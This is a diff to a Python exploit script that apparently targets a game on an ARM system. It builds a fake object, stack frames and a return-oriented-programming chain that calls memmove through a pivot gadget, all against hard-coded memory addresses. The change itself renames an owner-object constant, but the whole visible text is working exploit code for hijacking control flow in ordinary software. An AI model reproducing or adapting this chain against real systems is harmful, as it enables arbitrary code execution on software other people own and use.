@@ -16,10 +16,11 @@ N = B + 0x997B4
 H0 = B - 0x1C0628
 N_SIZE = 0x28
 NEXT_BLOCK_ADDR = N + 0x28 + N_SIZE
-N_OWNER_ADDR = 0x08C53AB8
+
+# Owner object referenced by the N block at +0x10.
+N_OWNER_ADDR = 0x166351C4
 
 # Game objects
-D = 0x166351C4
 DEV = 0x00857CC8
 WF = 0x08D87378
 FIELD = 0x08A0B310
@@ -110,7 +111,7 @@ def build_fake_object():
         p32(b, off + 0x10, 0)
         p32(b, off + 0x14, pc)
 
-    frame(INITIAL_STACK_OFF + 0x00, 0, 0, D + 4, 0, STR_R1_R2)  # D.ref = 0
+    frame(INITIAL_STACK_OFF + 0x00, 0, 0, N_OWNER_ADDR + 4, 0, STR_R1_R2)  # owner + 0x04 = 0
     frame(INITIAL_STACK_OFF + 0x18, 0, FIELD, FIELD_REF_SLOT_ADDR, RET_TRUE, STR_R1_R2)  # RET_TRUE also occupies fake-vtable slot P+0x84.
     frame(INITIAL_STACK_OFF + 0x30, 0, P + VIEW_CTX_OFF, SCRATCH_ADDR + 4, 0, STR_R1_R2)  # [SCRATCH_ADDR+4] = P+VIEW_CTX_OFF
     frame(INITIAL_STACK_OFF + 0x48, 0, PIVOT, SCRATCH_ADDR + 0xC, 0, STR_R1_R2)  # [SCRATCH_ADDR+0xC] = PIVOT
@@ -118,10 +119,10 @@ def build_fake_object():
 
     # Allocation context.
     p32(b, ALLOC_CTX_OFF + 0x00, P + DEV_SLOT_OFF)  # r0 = pointer to word containing DEV
-    p32(b, ALLOC_CTX_OFF + 0x04, D)  # r1 = owner
+    p32(b, ALLOC_CTX_OFF + 0x04, N_OWNER_ADDR)  # r1 = owner
     p32(b, ALLOC_CTX_OFF + 0x08, 40)  # r2 = size
     p32(b, ALLOC_CTX_OFF + 0x0C, 2)  # r3 = align shift
-    p32(b, ALLOC_CTX_OFF + 0x10, D + 0x14C)  # r4 = result slot for STORE_RESULT_RET
+    p32(b, ALLOC_CTX_OFF + 0x10, N_OWNER_ADDR + 0x14C)  # r4 = result slot for STORE_RESULT_RET
     p32(b, ALLOC_CTX_OFF + 0x14, P + VIEW_CTX_OFF)  # r5 -> r0 after STORE_RESULT_RET
     for off in range(0x18, 0x34, 4):
         p32(b, ALLOC_CTX_OFF + off, 0)
@@ -142,7 +143,7 @@ def build_fake_object():
 
     # ROP chain.
     chain = [
-        D + 0x14C,  # POP R1; LDR R0 -> r0 = p
+        N_OWNER_ADDR + 0x14C,  # POP R1; LDR R0 -> r0 = p
         LDR_R0_R1,
         POP_R2_TO_R4_PC,  # r2 = 40
         40,
@@ -153,16 +154,16 @@ def build_fake_object():
         MEMMOVE_FUNC,  # memmove(p, template, 40); r0=p, LR=0x18A2E8
         POP_LR_PC,  # restore LR=POP_PC (MEMMOVE_FUNC's internal BL clobbers LR)
         POP_PC,
-        POP_R1_PC,  # r1 = D+0x80
-        D + 0x80,
+        POP_R1_PC,  # r1 = owner + 0x80
+        N_OWNER_ADDR + 0x80,
         ADD8,  # p+8
         ADD8,  # p+16
-        STR_R0_R1,  # [D+0x80] = p+16
-        POP_R1_PC,  # r1 = D+0x218
-        D + 0x218,
+        STR_R0_R1,  # [owner + 0x80] = p+16
+        POP_R1_PC,  # r1 = owner + 0x218
+        N_OWNER_ADDR + 0x218,
         ADD8,  # p+24
         ADD8,  # p+32
-        STR_R0_R1,  # [D+0x218] = p+32
+        STR_R0_R1,  # [owner + 0x218] = p+32
         POP_R0_PC,  # r0 = view; PC = POP_LR_PC
         P + ALLOC_CTX_OFF,
         POP_LR_PC,  # LR = POP_R0_PC; PC = VIEW_POP_FUNC
